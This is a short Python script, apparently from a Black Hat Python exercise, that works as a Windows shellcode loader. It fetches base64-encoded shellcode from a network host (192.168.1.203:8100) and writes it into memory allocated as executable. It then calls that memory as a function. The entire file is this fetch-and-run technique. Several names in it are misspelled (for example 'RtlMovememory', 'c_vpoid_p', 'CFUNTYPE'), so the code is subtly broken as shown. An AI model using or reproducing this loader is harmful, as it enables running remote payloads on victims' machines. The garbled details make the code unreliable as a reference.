#!/usr/bin/env python
'''
Pythonic Shell Execution
BHP2e: page 133
'''

from urllib import request

import base64
import ctypes

kernel32  = ctypes.windll.kernel32

def get_code(url):
    with request.urlopen(url) as response:
        shellcode = base64.decodebytes(response.read())
    return shellcode

def write_memory(buf):
    length = len(buf)

    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    kernel32.RtlMovememory.argtype = (
        ctypes.c._void_p,
        ctypes.c_vpoid_p,
        ctypes.c_size_t)

    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)
    kernel32.RtlMovememory(ptr, buf, length)
    return ptr

def run(shellcode):
    buffer = ctypes.create_string_buffer(shellcode)

    ptr = write_memory(buffer)

    shell_func = ctypes.cast(ptr, ctypes.CFUNTYPE(None))
    shell_func()

if __name__ == '__main__':
    url = "http://192.168.1.203:8100/shellcode.bin"
    shellcode = get_code(url)
    run(shellcode)